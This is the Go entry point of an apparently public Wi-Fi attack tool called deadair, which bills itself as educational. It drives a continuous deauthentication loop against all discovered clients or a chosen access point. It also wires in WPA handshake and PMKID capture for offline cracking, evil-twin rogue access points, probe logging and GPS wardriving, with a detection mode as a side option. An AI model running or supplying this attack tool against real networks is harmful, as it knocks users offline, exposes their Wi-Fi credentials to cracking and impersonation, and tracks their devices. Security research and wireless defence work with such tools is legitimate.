package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/meetsoni15/deadair/internal/api"
	"github.com/meetsoni15/deadair/internal/capture"
	"github.com/meetsoni15/deadair/internal/deauth"
	"github.com/meetsoni15/deadair/internal/eviltwin"
	"github.com/meetsoni15/deadair/internal/gps"
	"github.com/meetsoni15/deadair/internal/iface"
	"github.com/meetsoni15/deadair/internal/probe"
	"github.com/meetsoni15/deadair/internal/scanner"
	"github.com/meetsoni15/deadair/internal/target"
	"github.com/meetsoni15/deadair/internal/ui"
	"github.com/meetsoni15/deadair/internal/wids"
)

func main() {
	// --- Core flags (unchanged from original) ---
	var (
		flagAP            = flag.String("a", "", "Target AP MAC address (leave empty to target all)")
		flagChannel       = flag.Int("c", 0, "Lock to this channel (0 = hop channels 1-11)")
		flagSkipBroadcast = flag.Bool("d", false, "Skip AP→broadcast deauth packets")
		flagIface         = flag.String("i", "", "Wireless interface (auto-detect if empty)")
		flagMax           = flag.Int("m", 0, "Max target APs before clearing the list (0 = unlimited)")
		flagNoClear       = flag.Bool("n", false, "Don't clear target list when max is hit")
		flagPackets       = flag.Int("p", 1, "Deauth packets per burst per target")
		flagSkipMAC       = flag.String("s", "", "Skip this MAC address (won't be deauthed)")
		flagInterval      = flag.Duration("t", 0, "Interval between each deauth packet send")
		flagWorld         = flag.Bool("world", false, "Use channels 1-13 (outside North America)")

		// --- New advanced flags ---
		flagMinRSSI     = flag.Int("min-rssi", 0, "Skip APs weaker than this dBm value (e.g. -80), 0 = no filter")
		flagPCAP        = flag.String("pcap", "", "Write live capture to file (e.g. capture.pcap)")
		flagHandshakes  = flag.String("handshakes", "handshakes", "Directory to save .hccapx handshake files")
		flagPMKID       = flag.String("pmkid", "", "File to append captured PMKIDs (hashcat 22000 format)")
		flagProbes      = flag.String("probes", "", "File to save probe request log as JSON on exit")
		flagWIDS        = flag.Bool("wids", false, "WIDS mode: detect deauth attacks instead of sending them")
		flagWIDSThresh  = flag.Int("wids-threshold", 5, "Deauth frames/sec threshold to trigger WIDS alert")
		flagAPI         = flag.Bool("api", false, "Enable HTTP dashboard (default port 8080)")
		flagAPIPort     = flag.Int("api-port", 8080, "HTTP dashboard port")
		flagGPS         = flag.Bool("gps", false, "Enable GPS tagging via gpsd at localhost:2947")
		flagGPSAddr     = flag.String("gps-addr", "localhost:2947", "gpsd address")
		flagWarmap      = flag.String("warmap", "warmap.geojson", "GeoJSON output file for wardriving map")
		flagEvilTwin    = flag.Bool("evil-twin", false, "Enable rogue AP after first channel scan (requires hostapd)")
		flagTwinIface   = flag.String("twin-iface", "", "Interface for evil twin AP (default: same as sniff iface)")
		flagInjectIface = flag.String("inject-iface", "", "Separate interface for packet injection (multi-interface mode)")
	)
	flag.Parse()

	fmt.Print(`
   ██████╗ ███████╗ █████╗ ██████╗      █████╗ ██╗██████╗
   ██╔══██╗██╔════╝██╔══██╗██╔══██╗    ██╔══██╗██║██╔══██╗
   ██║  ██║█████╗  ███████║██║  ██║    ███████║██║██████╔╝
   ██║  ██║██╔══╝  ██╔══██║██║  ██║    ██╔══██║██║██╔══██╗
   ██████╔╝███████╗██║  ██║██████╔╝    ██║  ██║██║██║  ██║
   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
   802.11 deauth tool — educational use only | github.com/meetsoni15/deadair
`)

	// --- Resolve interface ---
	ifaceName := *flagIface
	if ifaceName == "" {
		var err error
		ifaceName, err = iface.FindBest()
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("Auto-selected interface: %s\n", ifaceName)
	}

	// --- Enable monitor mode ---
	if !iface.IsAlreadyMonitor(ifaceName) {
		fmt.Printf("Enabling monitor mode on %s...\n", ifaceName)
		if err := iface.EnableMonitor(ifaceName); err != nil {
			fmt.Fprintf(os.Stderr, "Warning: %v\n", err)
			fmt.Println("Continuing anyway — you may need to manually enable monitor mode.")
		} else {
			monName := iface.MonitorName(ifaceName)
			ifaceName = monName
			fmt.Printf("Monitor interface: %s\n", ifaceName)
		}
	}
	defer func() {
		fmt.Println("\nRestoring managed mode...")
		_ = iface.DisableMonitor(ifaceName)
	}()

	// --- Injection interface (multi-interface mode) ---
	injectIface := ifaceName
	if *flagInjectIface != "" {
		injectIface = *flagInjectIface
		fmt.Printf("Multi-interface mode: sniff=%s inject=%s\n", ifaceName, injectIface)
	}

	// --- Shared target table ---
	maxTargets := *flagMax
	if *flagNoClear {
		maxTargets = 0
	}
	tbl := target.NewTable(maxTargets)

	// --- Parse MACs ---
	var skipMAC net.HardwareAddr
	if *flagSkipMAC != "" {
		var err error
		skipMAC, err = net.ParseMAC(*flagSkipMAC)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Invalid skip MAC %q: %v\n", *flagSkipMAC, err)
			os.Exit(1)
		}
	}
	var targetAP net.HardwareAddr
	if *flagAP != "" {
		var err error
		targetAP, err = net.ParseMAC(*flagAP)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Invalid AP MAC %q: %v\n", *flagAP, err)
			os.Exit(1)
		}
	}

	maxChan := 11
	if *flagWorld {
		maxChan = 13
	}

	// --- Build advanced subsystems ---

	// PCAP writer
	pcapWriter, err := capture.NewWriter(*flagPCAP)
	if err != nil {
		fmt.Fprintf(os.Stderr, "PCAP writer: %v\n", err)
	}
	defer pcapWriter.Close()
	if *flagPCAP != "" {
		fmt.Printf("PCAP capture → %s\n", *flagPCAP)
	}

	// Probe logger
	probeLog := probe.NewLog()

	// SSID lookup function (shared by handshake + PMKID)
	ssidFn := func(bssid string) string {
		for _, ap := range tbl.All() {
			if ap.BSSID.String() == bssid {
				return ap.SSID
			}
		}
		return bssid
	}

	// Handshake capture
	handshakeCap := capture.NewHandshakeCapture(ssidFn, *flagHandshakes)

	// PMKID capture
	var pmkidCap *capture.PMKIDCapture
	if *flagPMKID != "" {
		pmkidCap = capture.NewPMKIDCapture(ssidFn, *flagPMKID)
		fmt.Printf("PMKID capture → %s\n", *flagPMKID)
	}

	// WIDS detector
	var widsDetector *wids.Detector
	if *flagWIDS {
		widsDetector = wids.NewDetector(*flagWIDSThresh)
		fmt.Printf("WIDS mode enabled (threshold: %d frames/s)\n", *flagWIDSThresh)
	}

	// GPS client
	var gpsClient *gps.Client
	geoWriter := capture.NewGeoWriter("")
	if *flagGPS {
		gpsClient = gps.NewClient()
		geoWriter = capture.NewGeoWriter(*flagWarmap)
		go func() {
			if err := gpsClient.Run(*flagGPSAddr); err != nil {
				fmt.Fprintf(os.Stderr, "GPS: %v\n", err)
			}
		}()
		fmt.Printf("GPS enabled → warmap: %s\n", *flagWarmap)
	}

	// Evil twin manager
	var twinMgr *eviltwin.Manager
	if *flagEvilTwin {
		if !eviltwin.IsAvailable() {
			fmt.Fprintln(os.Stderr, "Warning: hostapd not found — evil twin disabled")
		} else {
			twinMgr = eviltwin.NewManager()
			fmt.Println("Evil twin mode enabled (activates after first channel scan)")
		}
	}

	// --- TUI ---
	model := ui.New(tbl, ifaceName)
	prog := tea.NewProgram(model, tea.WithAltScreen())

	// --- HTTP API ---
	if *flagAPI {
		apiServer := api.NewServer(tbl, ifaceName, *flagAPIPort)
		apiServer.Start()
		fmt.Printf("HTTP dashboard → http://localhost:%d\n", *flagAPIPort)
	}

	// --- Deauth sender ---
	sender, err := deauth.New(deauth.Config{
		Iface:         injectIface,
		Packets:       *flagPackets,
		Interval:      *flagInterval,
		SkipBroadcast: *flagSkipBroadcast,
		SkipMAC:       skipMAC,
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to open injection handle: %v\n", err)
		os.Exit(1)
	}
	defer sender.Close()

	// --- Channel hopper ---
	advanceCh := make(chan struct{}, 1)
	hopper := scanner.NewHopper(ifaceName, maxChan, *flagChannel)
	go func() { hopper.Run(advanceCh) }()

	// Forward channel hops to TUI
	go func() {
		for {
			time.Sleep(300 * time.Millisecond)
			if hopper.Current > 0 {
				prog.Send(ui.ChannelHopMsg{Channel: hopper.Current})
			}
		}
	}()

	// --- Sniffer with all hooks attached ---
	sniff := scanner.NewSniffer(ifaceName, tbl)
	sniff.MinRSSI = int8(*flagMinRSSI)
	sniff.PCAPWriter = pcapWriter
	sniff.ProbeLog = probeLog
	sniff.HandshakeCap = handshakeCap
	sniff.PMKIDCap = pmkidCap
	sniff.WIDS = widsDetector
	sniff.WIDSMode = *flagWIDS

	go func() {
		if err := sniff.Run(); err != nil {
			prog.Send(ui.ErrorMsg{Err: err})
		}
	}()

	// Forward sniffer events to TUI
	go func() {
		for ev := range sniff.Events {
			switch ev.Kind {
			case scanner.EventNewAP:
				// GPS tagging
				if gpsClient != nil {
					fix := gpsClient.Current()
					geoWriter.Record(ev.BSSID, ev.SSID, ev.RSSI, fix.Lat, fix.Lon)
				}
				prog.Send(ui.APDiscoveredMsg{BSSID: ev.BSSID.String(), SSID: ev.SSID, Channel: ev.Channel, RSSI: ev.RSSI})
			case scanner.EventNewClient:
				prog.Send(ui.ClientDiscoveredMsg{BSSID: ev.BSSID.String(), Client: ev.Client.String()})
			case scanner.EventProbe:
				prog.Send(ui.LogMsg{Text: "🌐 Probe: " + ev.Message})
			case scanner.EventHandshake:
				prog.Send(ui.LogMsg{Text: ev.Message})
			case scanner.EventPMKID:
				prog.Send(ui.LogMsg{Text: ev.Message})
			}
		}
	}()

	// Forward WIDS alerts to TUI
	if widsDetector != nil {
		go func() {
			for alert := range widsDetector.Alerts {
				prog.Send(ui.LogMsg{Text: "⚠️  " + alert.String()})
			}
		}()
	}

	// --- Deauth loop (skipped in WIDS mode) ---
	if !*flagWIDS {
		go func() {
			<-hopper.Ready

			// Activate evil twin after first full scan if enabled
			if twinMgr != nil {
				twinIface := *flagTwinIface
				if twinIface == "" {
					twinIface = ifaceName
				}
				for _, ap := range tbl.All() {
					if targetAP == nil || ap.BSSID.String() == targetAP.String() {
						if err := twinMgr.SpawnTwin(ap.BSSID, ap.SSID, ap.Channel, twinIface); err != nil {
							prog.Send(ui.LogMsg{Text: "❌ Evil twin: " + err.Error()})
						} else {
							prog.Send(ui.LogMsg{Text: "👾 Evil twin active: " + ap.SSID})
						}
					}
				}
			}

			for {
				aps := tbl.All()
				for _, ap := range aps {
					if targetAP != nil && ap.BSSID.String() != targetAP.String() {
						continue
					}
					for _, client := range ap.Clients {
						if model.Paused {
							time.Sleep(100 * time.Millisecond)
							continue
						}
						n := sender.Deauth(ap.BSSID, client)
						if n > 0 {
							tbl.IncrDeauths(ap.BSSID)
							prog.Send(ui.DeauthSentMsg{BSSID: ap.BSSID.String(), Count: n})
						}
					}
				}

				select {
				case advanceCh <- struct{}{}:
				default:
				}

				if !*flagNoClear {
					tbl.CheckAndClear()
				}
				time.Sleep(50 * time.Millisecond)
			}
		}()
	}

	// --- OS signal handling ---
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigCh
		// Cleanup on exit
		if twinMgr != nil {
			twinMgr.StopAll()
		}
		if gpsClient != nil {
			gpsClient.Stop()
			_ = geoWriter.Save()
			fmt.Printf("\nWarmap saved → %s\n", *flagWarmap)
		}
		if *flagProbes != "" {
			_ = probeLog.SaveJSON(*flagProbes)
			fmt.Printf("Probe log saved → %s\n", *flagProbes)
		}
		prog.Quit()
	}()

	// --- Run TUI ---
	if _, err := prog.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "TUI error: %v\n", err)
		os.Exit(1)
	}
}
